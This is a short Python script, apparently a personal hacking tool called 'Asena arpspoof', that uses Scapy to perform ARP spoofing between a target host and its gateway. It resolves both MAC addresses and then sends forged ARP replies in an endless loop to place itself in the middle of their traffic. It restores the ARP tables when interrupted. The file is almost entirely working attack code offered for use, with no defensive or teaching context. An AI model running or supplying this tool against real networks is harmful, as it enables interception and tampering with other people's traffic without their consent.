#-*- coding: utf-8 -*-
from scapy.all import *
import sys
import os

def main():
    try:
        try :
            trg_ip = sys.argv[1]
            g_ip = sys.argv[2]
        except:
            trg_ip = raw_input("[T] Target :")
            g_ip = raw_input("[G] Gateway :")

        def G_MAC(trg_ip):
            arp_packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=trg_ip)
            trg_mac = srp(arp_packet, timeout = 2, verbose = False)[0][0][1].hwsrc
            return trg_mac
            #gatewayy spoof
        def arp_spoof(trg_ip, trg_mac, src_ip):
            spoof = ARP(op = 2, pdst = trg_ip, psrc = src_ip, hwdst = trg_mac)
            send(spoof, verbose = False)

        #return back arpspoof
        def no_arp_spoof(trg_ip, trg_mac, src_ip, src_mac):
            packet = ARP(op=2, hwsrc = src_mac, psrc = src_ip, hwdst = trg_mac, pdst = trg_ip)
            send(packet, verbose=False)

        try:
            trg_mac = G_MAC(trg_ip)
            print ("[+]Target MAC ", trg_mac)
        except:
            print ("[-]Target is not respond")
            quit()
    
        try:
            g_mac = G_MAC(g_ip)
            print ("[+]Gateway MAC ", g_mac)
        except:
            print ("[-] May be an error in the gateway")
            quit()

        try:
            print ("[[+]OK ! ]")
            while True:
                arp_spoof(trg_ip, trg_mac, g_ip)#target mackinayı spoof
                arp_spoof(g_ip, g_mac, trg_ip)#target gateway spoof

        except:
            print ("ARP spoofing is stoped!")
            no_arp_spoof(g_ip, g_mac, trg_ip, trg_mac)
            no_arp_spoof(trg_ip, trg_mac,g_ip, g_mac)
            quit()

    except KeyboardInterrupt:
        print("Asena arpspoof is Shutdown...")
        sys.exit()
if __name__ == "__main__":
    main()
